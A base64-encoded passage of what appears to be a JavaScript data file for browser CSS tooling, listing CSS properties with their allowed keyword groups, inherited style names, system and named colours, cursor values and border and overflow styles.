SwNCiAgICAiYm9yZGVyLXRvcCI6IFsiYm9yZGVyU3R5bGUiLCAiYm9yZGVyQ29sbGFwc2UiLCAiY29sb3IiLCAic3lzdGVtQ29sb3IiLCAibm9uZSJdLA0KICAgICJib3JkZXItcmlnaHQiOiBbImJvcmRlclN0eWxlIiwgImJvcmRlckNvbGxhcHNlIiwgImNvbG9yIiwgInN5c3RlbUNvbG9yIiwgIm5vbmUiXSwNCiAgICAiYm9yZGVyLWJvdHRvbSI6IFsiYm9yZGVyU3R5bGUiLCAiYm9yZGVyQ29sbGFwc2UiLCAiY29sb3IiLCAic3lzdGVtQ29sb3IiLCAibm9uZSJdLA0KICAgICJib3JkZXItbGVmdCI6IFsiYm9yZGVyU3R5bGUiLCAiYm9yZGVyQ29sbGFwc2UiLCAiY29sb3IiLCAic3lzdGVtQ29sb3IiLCAibm9uZSJdLA0KICAgICJib3JkZXItY29sbGFwc2UiOiBbImJvcmRlckNvbGxhcHNlIl0sDQogICAgImJvcmRlci1jb2xvciI6IFsiY29sb3IiLCAic3lzdGVtQ29sb3IiXSwNCiAgICAiYm9yZGVyLXRvcC1jb2xvciI6IFsiY29sb3IiLCAic3lzdGVtQ29sb3IiXSwNCiAgICAiYm9yZGVyLXJpZ2h0LWNvbG9yIjogWyJjb2xvciIsICJzeXN0ZW1Db2xvciJdLA0KICAgICJib3JkZXItYm90dG9tLWNvbG9yIjogWyJjb2xvciIsICJzeXN0ZW1Db2xvciJdLA0KICAgICJib3JkZXItbGVmdC1jb2xvciI6IFsiY29sb3IiLCAic3lzdGVtQ29sb3IiXSwNCiAgICAiYm9yZGVyLXNwYWNpbmciOiBbXSwNCiAgICAiYm9yZGVyLXN0eWxlIjogWyJib3JkZXJTdHlsZSJdLA0KICAgICJib3JkZXItdG9wLXN0eWxlIjogWyJib3JkZXJTdHlsZSJdLA0KICAgICJib3JkZXItcmlnaHQtc3R5bGUiOiBbImJvcmRlclN0eWxlIl0sDQogICAgImJvcmRlci1ib3R0b20tc3R5bGUiOiBbImJvcmRlclN0eWxlIl0sDQogICAgImJvcmRlci1sZWZ0LXN0eWxlIjogWyJib3JkZXJTdHlsZSJdLA0KICAgICJib3JkZXItd2lkdGgiOiBbInRoaWNrbmVzcyJdLA0KICAgICJib3JkZXItdG9wLXdpZHRoIjogWyJ0aGlja25lc3MiXSwNCiAgICAiYm9yZGVyLXJpZ2h0LXdpZHRoIjogWyJ0aGlja25lc3MiXSwNCiAgICAiYm9yZGVyLWJvdHRvbS13aWR0aCI6IFsidGhpY2tuZXNzIl0sDQogICAgImJvcmRlci1sZWZ0LXdpZHRoIjogWyJ0aGlja25lc3MiXSwNCg0KICAgICJib3R0b20iOiBbImF1dG8iXSwNCiAgICAiY2FwdGlvbi1zaWRlIjogWyJjYXB0aW9uU2lkZSJdLA0KICAgICJjbGVhciI6IFsiY2xlYXIiLCAibm9uZSJdLA0KICAgICJjbGlwIjogWyJhdXRvIl0sDQogICAgImNvbG9yIjogWyJjb2xvciIsICJzeXN0ZW1Db2xvciJdLA0KICAgICJjb250ZW50IjogWyJjb250ZW50Il0sDQogICAgImNvdW50ZXItaW5jcmVtZW50IjogWyJub25lIl0sDQogICAgImNvdW50ZXItcmVzZXQiOiBbIm5vbmUiXSwNCiAgICAiY3Vyc29yIjogWyJjdXJzb3IiLCAibm9uZSJdLA0KICAgICJkaXJlY3Rpb24iOiBbImRpcmVjdGlvbiJdLA0KICAgICJkaXNwbGF5IjogWyJkaXNwbGF5IiwgIm5vbmUiXSwNCiAgICAiZW1wdHktY2VsbHMiOiBbXSwNCiAgICAiZmxvYXQiOiBbImZsb2F0IiwgIm5vbmUiXSwNCiAgICAiZm9udCI6IFsiZm9udFN0eWxlIiwgImZvbnRWYXJpYW50IiwgImZvbnRXZWlnaHQiLCAiZm9udEZhbWlseSJdLA0KDQogICAgImZvbnQtZmFtaWx5IjogWyJmb250RmFtaWx5Il0sDQogICAgImZvbnQtc2l6ZSI6IFsiZm9udFNpemUiXSwNCiAgICAiZm9udC1zaXplLWFkanVzdCI6IFtdLA0KICAgICJmb250LXN0cmV0Y2giOiBbXSwNCiAgICAiZm9udC1zdHlsZSI6IFsiZm9udFN0eWxlIl0sDQogICAgImZvbnQtdmFyaWFudCI6IFsiZm9udFZhcmlhbnQiXSwNCiAgICAiZm9udC13ZWlnaHQiOiBbImZvbnRXZWlnaHQiXSwNCg0KICAgICJoZWlnaHQiOiBbImF1dG8iXSwNCiAgICAibGVmdCI6IFsiYXV0byJdLA0KICAgICJsZXR0ZXItc3BhY2luZyI6IFtdLA0KICAgICJsaW5lLWhlaWdodCI6IFtdLA0KDQogICAgImxpc3Qtc3R5bGUiOiBbImxpc3RTdHlsZVR5cGUiLCAibGlzdFN0eWxlUG9zaXRpb24iLCAibm9uZSJdLA0KICAgICJsaXN0LXN0eWxlLWltYWdlIjogWyJub25lIl0sDQogICAgImxpc3Qtc3R5bGUtcG9zaXRpb24iOiBbImxpc3RTdHlsZVBvc2l0aW9uIl0sDQogICAgImxpc3Qtc3R5bGUtdHlwZSI6IFsibGlzdFN0eWxlVHlwZSIsICJub25lIl0sDQoNCiAgICAibWFyZ2luIjogW10sDQogICAgIm1hcmdpbi10b3AiOiBbXSwNCiAgICAibWFyZ2luLXJpZ2h0IjogW10sDQogICAgIm1hcmdpbi1ib3R0b20iOiBbXSwNCiAgICAibWFyZ2luLWxlZnQiOiBbXSwNCg0KICAgICJtYXJrZXItb2Zmc2V0IjogWyJhdXRvIl0sDQogICAgIm1pbi1oZWlnaHQiOiBbIm5vbmUiXSwNCiAgICAibWF4LWhlaWdodCI6IFsibm9uZSJdLA0KICAgICJtaW4td2lkdGgiOiBbIm5vbmUiXSwNCiAgICAibWF4LXdpZHRoIjogWyJub25lIl0sDQoNCiAgICAib3V0bGluZSI6IFsiYm9yZGVyU3R5bGUiLCAiY29sb3IiLCAic3lzdGVtQ29sb3IiLCAibm9uZSJdLA0KICAgICJvdXRsaW5lLWNvbG9yIjogWyJjb2xvciIsICJzeXN0ZW1Db2xvciJdLA0KICAgICJvdXRsaW5lLXN0eWxlIjogWyJib3JkZXJTdHlsZSJdLA0KICAgICJvdXRsaW5lLXdpZHRoIjogW10sDQoNCiAgICAib3ZlcmZsb3ciOiBbIm92ZXJmbG93IiwgImF1dG8iXSwNCiAgICAib3ZlcmZsb3cteCI6IFsib3ZlcmZsb3ciLCAiYXV0byJdLA0KICAgICJvdmVyZmxvdy15IjogWyJvdmVyZmxvdyIsICJhdXRvIl0sDQoNCiAgICAicGFkZGluZyI6IFtdLA0KICAgICJwYWRkaW5nLXRvcCI6IFtdLA0KICAgICJwYWRkaW5nLXJpZ2h0IjogW10sDQogICAgInBhZGRpbmctYm90dG9tIjogW10sDQogICAgInBhZGRpbmctbGVmdCI6IFtdLA0KDQogICAgInBvc2l0aW9uIjogWyJwb3NpdGlvbiJdLA0KICAgICJxdW90ZXMiOiBbIm5vbmUiXSwNCiAgICAicmlnaHQiOiBbImF1dG8iXSwNCiAgICAidGFibGUtbGF5b3V0IjogWyJ0YWJsZUxheW91dCIsICJhdXRvIl0sDQogICAgInRleHQtYWxpZ24iOiBbInRleHRBbGlnbiJdLA0KICAgICJ0ZXh0LWRlY29yYXRpb24iOiBbInRleHREZWNvcmF0aW9uIiwgIm5vbmUiXSwNCiAgICAidGV4dC1pbmRlbnQiOiBbXSwNCiAgICAidGV4dC1zaGFkb3ciOiBbXSwNCiAgICAidGV4dC10cmFuc2Zvcm0iOiBbInRleHRUcmFuc2Zvcm0iLCAibm9uZSJdLA0KICAgICJ0b3AiOiBbImF1dG8iXSwNCiAgICAidW5pY29kZS1iaWRpIjogW10sDQogICAgInZlcnRpY2FsLWFsaWduIjogWyJ2ZXJ0aWNhbEFsaWduIl0sDQogICAgIndoaXRlLXNwYWNlIjogWyJ3aGl0ZVNwYWNlIl0sDQogICAgIndpZHRoIjogWyJhdXRvIl0sDQogICAgIndvcmQtc3BhY2luZyI6IFtdLA0KICAgICJ6LWluZGV4IjogW10sDQoNCiAgICAiLW1vei1hcHBlYXJhbmNlIjogWyJtb3pBcHBlYXJhbmNlIl0sDQogICAgIi1tb3otYm9yZGVyLXJhZGl1cyI6IFtdLA0KICAgICItbW96LWJvcmRlci1yYWRpdXMtYm90dG9tbGVmdCI6IFtdLA0KICAgICItbW96LWJvcmRlci1yYWRpdXMtYm90dG9tcmlnaHQiOiBbXSwNCiAgICAiLW1vei1ib3JkZXItcmFkaXVzLXRvcGxlZnQiOiBbXSwNCiAgICAiLW1vei1ib3JkZXItcmFkaXVzLXRvcHJpZ2h0IjogW10sDQogICAgIi1tb3otYm9yZGVyLXRvcC1jb2xvcnMiOiBbImNvbG9yIiwgInN5c3RlbUNvbG9yIl0sDQogICAgIi1tb3otYm9yZGVyLXJpZ2h0LWNvbG9ycyI6IFsiY29sb3IiLCAic3lzdGVtQ29sb3IiXSwNCiAgICAiLW1vei1ib3JkZXItYm90dG9tLWNvbG9ycyI6IFsiY29sb3IiLCAic3lzdGVtQ29sb3IiXSwNCiAgICAiLW1vei1ib3JkZXItbGVmdC1jb2xvcnMiOiBbImNvbG9yIiwgInN5c3RlbUNvbG9yIl0sDQogICAgIi1tb3otYm94LWFsaWduIjogWyJtb3pCb3hBbGlnbiJdLA0KICAgICItbW96LWJveC1kaXJlY3Rpb24iOiBbIm1vekJveERpcmVjdGlvbiJdLA0KICAgICItbW96LWJveC1mbGV4IjogW10sDQogICAgIi1tb3otYm94LW9yZGluYWwtZ3JvdXAiOiBbXSwNCiAgICAiLW1vei1ib3gtb3JpZW50IjogWyJtb3pCb3hPcmllbnQiXSwNCiAgICAiLW1vei1ib3gtcGFjayI6IFsibW96Qm94UGFjayJdLA0KICAgICItbW96LWJveC1zaXppbmciOiBbIm1vekJveFNpemluZyJdLA0KICAgICItbW96LW9wYWNpdHkiOiBbXSwNCiAgICAiLW1vei11c2VyLWZvY3VzIjogWyJ1c2VyRm9jdXMiLCAibm9uZSJdLA0KICAgICItbW96LXVzZXItaW5wdXQiOiBbInVzZXJJbnB1dCJdLA0KICAgICItbW96LXVzZXItbW9kaWZ5IjogW10sDQogICAgIi1tb3otdXNlci1zZWxlY3QiOiBbInVzZXJTZWxlY3QiLCAibm9uZSJdLA0KICAgICItbW96LWJhY2tncm91bmQtY2xpcCI6IFtdLA0KICAgICItbW96LWJhY2tncm91bmQtaW5saW5lLXBvbGljeSI6IFtdLA0KICAgICItbW96LWJhY2tncm91bmQtb3JpZ2luIjogW10sDQogICAgIi1tb3otYmluZGluZyI6IFtdLA0KICAgICItbW96LWNvbHVtbi1jb3VudCI6IFtdLA0KICAgICItbW96LWNvbHVtbi1nYXAiOiBbXSwNCiAgICAiLW1vei1jb2x1bW4td2lkdGgiOiBbXSwNCiAgICAiLW1vei1pbWFnZS1yZWdpb24iOiBbXQ0KfTsNCg0KdGhpcy5pbmhlcml0ZWRTdHlsZU5hbWVzID0NCnsNCiAgICAiYm9yZGVyLWNvbGxhcHNlIjogMSwNCiAgICAiYm9yZGVyLXNwYWNpbmciOiAxLA0KICAgICJib3JkZXItc3R5bGUiOiAxLA0KICAgICJjYXB0aW9uLXNpZGUiOiAxLA0KICAgICJjb2xvciI6IDEsDQogICAgImN1cnNvciI6IDEsDQogICAgImRpcmVjdGlvbiI6IDEsDQogICAgImVtcHR5LWNlbGxzIjogMSwNCiAgICAiZm9udCI6IDEsDQogICAgImZvbnQtZmFtaWx5IjogMSwNCiAgICAiZm9udC1zaXplLWFkanVzdCI6IDEsDQogICAgImZvbnQtc2l6ZSI6IDEsDQogICAgImZvbnQtc3R5bGUiOiAxLA0KICAgICJmb250LXZhcmlhbnQiOiAxLA0KICAgICJmb250LXdlaWdodCI6IDEsDQogICAgImxldHRlci1zcGFjaW5nIjogMSwNCiAgICAibGluZS1oZWlnaHQiOiAxLA0KICAgICJsaXN0LXN0eWxlIjogMSwNCiAgICAibGlzdC1zdHlsZS1pbWFnZSI6IDEsDQogICAgImxpc3Qtc3R5bGUtcG9zaXRpb24iOiAxLA0KICAgICJsaXN0LXN0eWxlLXR5cGUiOiAxLA0KICAgICJxdW90ZXMiOiAxLA0KICAgICJ0ZXh0LWFsaWduIjogMSwNCiAgICAidGV4dC1kZWNvcmF0aW9uIjogMSwNCiAgICAidGV4dC1pbmRlbnQiOiAxLA0KICAgICJ0ZXh0LXNoYWRvdyI6IDEsDQogICAgInRleHQtdHJhbnNmb3JtIjogMSwNCiAgICAid2hpdGUtc3BhY2UiOiAxLA0KICAgICJ3b3JkLXNwYWNpbmciOiAxDQp9Ow0KDQp0aGlzLmNzc0tleXdvcmRzID0NCnsNCiAgICAiYXBwZWFyYW5jZSI6DQogICAgWw0KICAgICAgICAiYnV0dG9uIiwNCiAgICAgICAgImJ1dHRvbi1zbWFsbCIsDQogICAgICAgICJjaGVja2JveCIsDQogICAgICAgICJjaGVja2JveC1jb250YWluZXIiLA0KICAgICAgICAiY2hlY2tib3gtc21hbGwiLA0KICAgICAgICAiZGlhbG9nIiwNCiAgICAgICAgImxpc3Rib3giLA0KICAgICAgICAibWVudWl0ZW0iLA0KICAgICAgICAibWVudWxpc3QiLA0KICAgICAgICAibWVudWxpc3QtYnV0dG9uIiwNCiAgICAgICAgIm1lbnVsaXN0LXRleHRmaWVsZCIsDQogICAgICAgICJtZW51cG9wdXAiLA0KICAgICAgICAicHJvZ3Jlc3NiYXIiLA0KICAgICAgICAicmFkaW8iLA0KICAgICAgICAicmFkaW8tY29udGFpbmVyIiwNCiAgICAgICAgInJhZGlvLXNtYWxsIiwNCiAgICAgICAgInJlc2l6ZXIiLA0KICAgICAgICAic2Nyb2xsYmFyIiwNCiAgICAgICAgInNjcm9sbGJhcmJ1dHRvbi1kb3duIiwNCiAgICAgICAgInNjcm9sbGJhcmJ1dHRvbi1sZWZ0IiwNCiAgICAgICAgInNjcm9sbGJhcmJ1dHRvbi1yaWdodCIsDQogICAgICAgICJzY3JvbGxiYXJidXR0b24tdXAiLA0KICAgICAgICAic2Nyb2xsYmFydHJhY2staG9yaXpvbnRhbCIsDQogICAgICAgICJzY3JvbGxiYXJ0cmFjay12ZXJ0aWNhbCIsDQogICAgICAgICJzZXBhcmF0b3IiLA0KICAgICAgICAic3RhdHVzYmFyIiwNCiAgICAgICAgInRhYiIsDQogICAgICAgICJ0YWItbGVmdC1lZGdlIiwNCiAgICAgICAgInRhYnBhbmVscyIsDQogICAgICAgICJ0ZXh0ZmllbGQiLA0KICAgICAgICAidG9vbGJhciIsDQogICAgICAgICJ0b29sYmFyYnV0dG9uIiwNCiAgICAgICAgInRvb2xib3giLA0KICAgICAgICAidG9vbHRpcCIsDQogICAgICAgICJ0cmVlaGVhZGVyY2VsbCIsDQogICAgICAgICJ0cmVlaGVhZGVyc29ydGFycm93IiwNCiAgICAgICAgInRyZWVpdGVtIiwNCiAgICAgICAgInRyZWV0d2lzdHkiLA0KICAgICAgICAidHJlZXR3aXN0eW9wZW4iLA0KICAgICAgICAidHJlZXZpZXciLA0KICAgICAgICAid2luZG93Ig0KICAgIF0sDQoNCiAgICAic3lzdGVtQ29sb3IiOg0KICAgIFsNCiAgICAgICAgIkFjdGl2ZUJvcmRlciIsDQogICAgICAgICJBY3RpdmVDYXB0aW9uIiwNCiAgICAgICAgIkFwcFdvcmtzcGFjZSIsDQogICAgICAgICJCYWNrZ3JvdW5kIiwNCiAgICAgICAgIkJ1dHRvbkZhY2UiLA0KICAgICAgICAiQnV0dG9uSGlnaGxpZ2h0IiwNCiAgICAgICAgIkJ1dHRvblNoYWRvdyIsDQogICAgICAgICJCdXR0b25UZXh0IiwNCiAgICAgICAgIkNhcHRpb25UZXh0IiwNCiAgICAgICAgIkdyYXlUZXh0IiwNCiAgICAgICAgIkhpZ2hsaWdodCIsDQogICAgICAgICJIaWdobGlnaHRUZXh0IiwNCiAgICAgICAgIkluYWN0aXZlQm9yZGVyIiwNCiAgICAgICAgIkluYWN0aXZlQ2FwdGlvbiIsDQogICAgICAgICJJbmFjdGl2ZUNhcHRpb25UZXh0IiwNCiAgICAgICAgIkluZm9CYWNrZ3JvdW5kIiwNCiAgICAgICAgIkluZm9UZXh0IiwNCiAgICAgICAgIk1lbnUiLA0KICAgICAgICAiTWVudVRleHQiLA0KICAgICAgICAiU2Nyb2xsYmFyIiwNCiAgICAgICAgIlRocmVlRERhcmtTaGFkb3ciLA0KICAgICAgICAiVGhyZWVERmFjZSIsDQogICAgICAgICJUaHJlZURIaWdobGlnaHQiLA0KICAgICAgICAiVGhyZWVETGlnaHRTaGFkb3ciLA0KICAgICAgICAiVGhyZWVEU2hhZG93IiwNCiAgICAgICAgIldpbmRvdyIsDQogICAgICAgICJXaW5kb3dGcmFtZSIsDQogICAgICAgICJXaW5kb3dUZXh0IiwNCiAgICAgICAgIi1tb3otZmllbGQiLA0KICAgICAgICAiLW1vei1maWVsZHRleHQiLA0KICAgICAgICAiLW1vei13b3Jrc3BhY2UiLA0KICAgICAgICAiLW1vei12aXNpdGVkaHlwZXJsaW5rdGV4dCIsDQogICAgICAgICItbW96LXVzZS10ZXh0LWNvbG9yIg0KICAgIF0sDQoNCiAgICAiY29sb3IiOg0KICAgIFsNCiAgICAgICAgIkFsaWNlQmx1ZSIsDQogICAgICAgICJBbnRpcXVlV2hpdGUiLA0KICAgICAgICAiQXF1YSIsDQogICAgICAgICJBcXVhbWFyaW5lIiwNCiAgICAgICAgIkF6dXJlIiwNCiAgICAgICAgIkJlaWdlIiwNCiAgICAgICAgIkJpc3F1ZSIsDQogICAgICAgICJCbGFjayIsDQogICAgICAgICJCbGFuY2hlZEFsbW9uZCIsDQogICAgICAgICJCbHVlIiwNCiAgICAgICAgIkJsdWVWaW9sZXQiLA0KICAgICAgICAiQnJvd24iLA0KICAgICAgICAiQnVybHlXb29kIiwNCiAgICAgICAgIkNhZGV0Qmx1ZSIsDQogICAgICAgICJDaGFydHJldXNlIiwNCiAgICAgICAgIkNob2NvbGF0ZSIsDQogICAgICAgICJDb3JhbCIsDQogICAgICAgICJDb3JuZmxvd2VyQmx1ZSIsDQogICAgICAgICJDb3Juc2lsayIsDQogICAgICAgICJDcmltc29uIiwNCiAgICAgICAgIkN5YW4iLA0KICAgICAgICAiRGFya0JsdWUiLA0KICAgICAgICAiRGFya0N5YW4iLA0KICAgICAgICAiRGFya0dvbGRlblJvZCIsDQogICAgICAgICJEYXJrR3JheSIsDQogICAgICAgICJEYXJrR3JlZW4iLA0KICAgICAgICAiRGFya0toYWtpIiwNCiAgICAgICAgIkRhcmtNYWdlbnRhIiwNCiAgICAgICAgIkRhcmtPbGl2ZUdyZWVuIiwNCiAgICAgICAgIkRhcmtPcmFuZ2UiLA0KICAgICAgICAiRGFya09yY2hpZCIsDQogICAgICAgICJEYXJrUmVkIiwNCiAgICAgICAgIkRhcmtTYWxtb24iLA0KICAgICAgICAiRGFya1NlYUdyZWVuIiwNCiAgICAgICAgIkRhcmtTbGF0ZUJsdWUiLA0KICAgICAgICAiRGFya1NsYXRlR3JheSIsDQogICAgICAgICJEYXJrVHVycXVvaXNlIiwNCiAgICAgICAgIkRhcmtWaW9sZXQiLA0KICAgICAgICAiRGVlcFBpbmsiLA0KICAgICAgICAiRGFya1NreUJsdWUiLA0KICAgICAgICAiRGltR3JheSIsDQogICAgICAgICJEb2RnZXJCbHVlIiwNCiAgICAgICAgIkZlbGRzcGFyIiwNCiAgICAgICAgIkZpcmVCcmljayIsDQogICAgICAgICJGbG9yYWxXaGl0ZSIsDQogICAgICAgICJGb3Jlc3RHcmVlbiIsDQogICAgICAgICJGdWNoc2lhIiwNCiAgICAgICAgIkdhaW5zYm9ybyIsDQogICAgICAgICJHaG9zdFdoaXRlIiwNCiAgICAgICAgIkdvbGQiLA0KICAgICAgICAiR29sZGVuUm9kIiwNCiAgICAgICAgIkdyYXkiLA0KICAgICAgICAiR3JlZW4iLA0KICAgICAgICAiR3JlZW5ZZWxsb3ciLA0KICAgICAgICAiSG9uZXlEZXciLA0KICAgICAgICAiSG90UGluayIsDQogICAgICAgICJJbmRpYW5SZWQiLA0KICAgICAgICAiSW5kaWdvIiwNCiAgICAgICAgIkl2b3J5IiwNCiAgICAgICAgIktoYWtpIiwNCiAgICAgICAgIkxhdmVuZGVyIiwNCiAgICAgICAgIkxhdmVuZGVyQmx1c2giLA0KICAgICAgICAiTGF3bkdyZWVuIiwNCiAgICAgICAgIkxlbW9uQ2hpZmZvbiIsDQogICAgICAgICJMaWdodEJsdWUiLA0KICAgICAgICAiTGlnaHRDb3JhbCIsDQogICAgICAgICJMaWdodEN5YW4iLA0KICAgICAgICAiTGlnaHRHb2xkZW5Sb2RZZWxsb3ciLA0KICAgICAgICAiTGlnaHRHcmV5IiwNCiAgICAgICAgIkxpZ2h0R3JlZW4iLA0KICAgICAgICAiTGlnaHRQaW5rIiwNCiAgICAgICAgIkxpZ2h0U2FsbW9uIiwNCiAgICAgICAgIkxpZ2h0U2VhR3JlZW4iLA0KICAgICAgICAiTGlnaHRTa3lCbHVlIiwNCiAgICAgICAgIkxpZ2h0U2xhdGVCbHVlIiwNCiAgICAgICAgIkxpZ2h0U2xhdGVHcmF5IiwNCiAgICAgICAgIkxpZ2h0U3RlZWxCbHVlIiwNCiAgICAgICAgIkxpZ2h0WWVsbG93IiwNCiAgICAgICAgIkxpbWUiLA0KICAgICAgICAiTGltZUdyZWVuIiwNCiAgICAgICAgIkxpbmVuIiwNCiAgICAgICAgIk1hZ2VudGEiLA0KICAgICAgICAiTWFyb29uIiwNCiAgICAgICAgIk1lZGl1bUFxdWFNYXJpbmUiLA0KICAgICAgICAiTWVkaXVtQmx1ZSIsDQogICAgICAgICJNZWRpdW1PcmNoaWQiLA0KICAgICAgICAiTWVkaXVtUHVycGxlIiwNCiAgICAgICAgIk1lZGl1bVNlYUdyZWVuIiwNCiAgICAgICAgIk1lZGl1bVNsYXRlQmx1ZSIsDQogICAgICAgICJNZWRpdW1TcHJpbmdHcmVlbiIsDQogICAgICAgICJNZWRpdW1UdXJxdW9pc2UiLA0KICAgICAgICAiTWVkaXVtVmlvbGV0UmVkIiwNCiAgICAgICAgIk1pZG5pZ2h0Qmx1ZSIsDQogICAgICAgICJNaW50Q3JlYW0iLA0KICAgICAgICAiTWlzdHlSb3NlIiwNCiAgICAgICAgIk1vY2Nhc2luIiwNCiAgICAgICAgIk5hdmFqb1doaXRlIiwNCiAgICAgICAgIk5hdnkiLA0KICAgICAgICAiT2xkTGFjZSIsDQogICAgICAgICJPbGl2ZSIsDQogICAgICAgICJPbGl2ZURyYWIiLA0KICAgICAgICAiT3JhbmdlIiwNCiAgICAgICAgIk9yYW5nZVJlZCIsDQogICAgICAgICJPcmNoaWQiLA0KICAgICAgICAiUGFsZUdvbGRlblJvZCIsDQogICAgICAgICJQYWxlR3JlZW4iLA0KICAgICAgICAiUGFsZVR1cnF1b2lzZSIsDQogICAgICAgICJQYWxlVmlvbGV0UmVkIiwNCiAgICAgICAgIlBhcGF5YVdoaXAiLA0KICAgICAgICAiUGVhY2hQdWZmIiwNCiAgICAgICAgIlBlcnUiLA0KICAgICAgICAiUGluayIsDQogICAgICAgICJQbHVtIiwNCiAgICAgICAgIlBvd2RlckJsdWUiLA0KICAgICAgICAiUHVycGxlIiwNCiAgICAgICAgIlJlZCIsDQogICAgICAgICJSb3N5QnJvd24iLA0KICAgICAgICAiUm95YWxCbHVlIiwNCiAgICAgICAgIlNhZGRsZUJyb3duIiwNCiAgICAgICAgIlNhbG1vbiIsDQogICAgICAgICJTYW5keUJyb3duIiwNCiAgICAgICAgIlNlYUdyZWVuIiwNCiAgICAgICAgIlNlYVNoZWxsIiwNCiAgICAgICAgIlNpZW5uYSIsDQogICAgICAgICJTaWx2ZXIiLA0KICAgICAgICAiU2t5Qmx1ZSIsDQogICAgICAgICJTbGF0ZUJsdWUiLA0KICAgICAgICAiU2xhdGVHcmF5IiwNCiAgICAgICAgIlNub3ciLA0KICAgICAgICAiU3ByaW5nR3JlZW4iLA0KICAgICAgICAiU3RlZWxCbHVlIiwNCiAgICAgICAgIlRhbiIsDQogICAgICAgICJUZWFsIiwNCiAgICAgICAgIlRoaXN0bGUiLA0KICAgICAgICAiVG9tYXRvIiwNCiAgICAgICAgIlR1cnF1b2lzZSIsDQogICAgICAgICJWaW9sZXQiLA0KICAgICAgICAiVmlvbGV0UmVkIiwNCiAgICAgICAgIldoZWF0IiwNCiAgICAgICAgIldoaXRlIiwNCiAgICAgICAgIldoaXRlU21va2UiLA0KICAgICAgICAiWWVsbG93IiwNCiAgICAgICAgIlllbGxvd0dyZWVuIiwNCiAgICAgICAgInRyYW5zcGFyZW50IiwNCiAgICAgICAgImludmVydCINCiAgICBdLA0KDQogICAgImF1dG8iOg0KICAgIFsNCiAgICAgICAgImF1dG8iDQogICAgXSwNCg0KICAgICJub25lIjoNCiAgICBbDQogICAgICAgICJub25lIg0KICAgIF0sDQoNCiAgICAiY2FwdGlvblNpZGUiOg0KICAgIFsNCiAgICAgICAgInRvcCIsDQogICAgICAgICJib3R0b20iLA0KICAgICAgICAibGVmdCIsDQogICAgICAgICJyaWdodCINCiAgICBdLA0KDQogICAgImNsZWFyIjoNCiAgICBbDQogICAgICAgICJsZWZ0IiwNCiAgICAgICAgInJpZ2h0IiwNCiAgICAgICAgImJvdGgiDQogICAgXSwNCg0KICAgICJjdXJzb3IiOg0KICAgIFsNCiAgICAgICAgImF1dG8iLA0KICAgICAgICAiY2VsbCIsDQogICAgICAgICJjb250ZXh0LW1lbnUiLA0KICAgICAgICAiY3Jvc3NoYWlyIiwNCiAgICAgICAgImRlZmF1bHQiLA0KICAgICAgICAiaGVscCIsDQogICAgICAgICJwb2ludGVyIiwNCiAgICAgICAgInByb2dyZXNzIiwNCiAgICAgICAgIm1vdmUiLA0KICAgICAgICAiZS1yZXNpemUiLA0KICAgICAgICAiYWxsLXNjcm9sbCIsDQogICAgICAgICJuZS1yZXNpemUiLA0KICAgICAgICAibnctcmVzaXplIiwNCiAgICAgICAgIm4tcmVzaXplIiwNCiAgICAgICAgInNlLXJlc2l6ZSIsDQogICAgICAgICJzdy1yZXNpemUiLA0KICAgICAgICAicy1yZXNpemUiLA0KICAgICAgICAidy1yZXNpemUiLA0KICAgICAgICAiZXctcmVzaXplIiwNCiAgICAgICAgIm5zLXJlc2l6ZSIsDQogICAgICAgICJuZXN3LXJlc2l6ZSIsDQogICAgICAgICJud3NlLXJlc2l6ZSIsDQogICAgICAgICJjb2wtcmVzaXplIiwNCiAgICAgICAgInJvdy1yZXNpemUiLA0KICAgICAgICAidGV4dCIsDQogICAgICAgICJ2ZXJ0aWNhbC10ZXh0IiwNCiAgICAgICAgIndhaXQiLA0KICAgICAgICAiYWxpYXMiLA0KICAgICAgICAiY29weSIsDQogICAgICAgICJtb3ZlIiwNCiAgICAgICAgIm5vLWRyb3AiLA0KICAgICAgICAibm90LWFsbG93ZWQiLA0KICAgICAgICAiLW1vei1hbGlhcyIsDQogICAgICAgICItbW96LWNlbGwiLA0KICAgICAgICAiLW1vei1jb3B5IiwNCiAgICAgICAgIi1tb3otZ3JhYiIsDQogICAgICAgICItbW96LWdyYWJiaW5nIiwNCiAgICAgICAgIi1tb3otY29udGV4dG1lbnUiLA0KICAgICAgICAiLW1vei16b29tLWluIiwNCiAgICAgICAgIi1tb3otem9vbS1vdXQiLA0KICAgICAgICAiLW1vei1zcGlubmluZyINCiAgICBdLA0KDQogICAgImRpcmVjdGlvbiI6DQogICAgWw0KICAgICAgICAibHRyIiwNCiAgICAgICAgInJ0bCINCiAgICBdLA0KDQogICAgImJnQXR0YWNobWVudCI6DQogICAgWw0KICAgICAgICAic2Nyb2xsIiwNCiAgICAgICAgImZpeGVkIg0KICAgIF0sDQoNCiAgICAiYmdQb3NpdGlvbiI6DQogICAgWw0KICAgICAgICAidG9wIiwNCiAgICAgICAgImNlbnRlciIsDQogICAgICAgICJib3R0b20iLA0KICAgICAgICAibGVmdCIsDQogICAgICAgICJyaWdodCINCiAgICBdLA0KDQogICAgImJnUmVwZWF0IjoNCiAgICBbDQogICAgICAgICJyZXBlYXQiLA0KICAgICAgICAicmVwZWF0LXgiLA0KICAgICAgICAicmVwZWF0LXkiLA0KICAgICAgICAibm8tcmVwZWF0Ig0KICAgIF0sDQoNCiAgICAiYm9yZGVyU3R5bGUiOg0KICAgIFsNCiAgICAgICAgImhpZGRlbiIsDQogICAgICAgICJkb3R0ZWQiLA0KICAgICAgICAiZGFzaGVkIiwNCiAgICAgICAgInNvbGlkIiwNCiAgICAgICAgImRvdWJsZSIsDQogICAgICAgICJncm9vdmUiLA0KICAgICAgICAicmlkZ2UiLA0KICAgICAgICAiaW5zZXQiLA0KICAgICAgICAib3V0c2V0IiwNCiAgICAgICAgIi1tb3otYmctaW5zZXQiLA0KICAgICAgICAiLW1vei1iZy1vdXRzZXQiLA0KICAgICAgICAiLW1vei1iZy1zb2xpZCINCiAgICBdLA0KDQogICAgImJvcmRlckNvbGxhcHNlIjoNCiAgICBbDQogICAgICAgICJjb2xsYXBzZSIsDQogICAgICAgICJzZXBhcmF0ZSINCiAgICBdLA0KDQogICAgIm92ZXJmbG93IjoNCiAgICBbDQogICAgICAgICJ2aXNpYmxlIiwNCiAgICAgICAgImhpZGRlbiIsDQogICAgICAgICJzY3JvbGwiLA0KICAgICAgICAiLW1vei1zY3JvbGxiYXJzLWhvcml6b250YWwiLA0KICAgICAgICAiLW1vei1zY3JvbGxiYXJzLW5vbmUiLA0KICAgICAgICAiLW1vei1zY3JvbGxiYXJzLXZlcnRpY2FsIg0KICAgIF0sDQoNCiAgICAibGlzdFN0eWxlVHlwZSI6DQogICAgWw0KICAgICAgICAiZGlzYyIs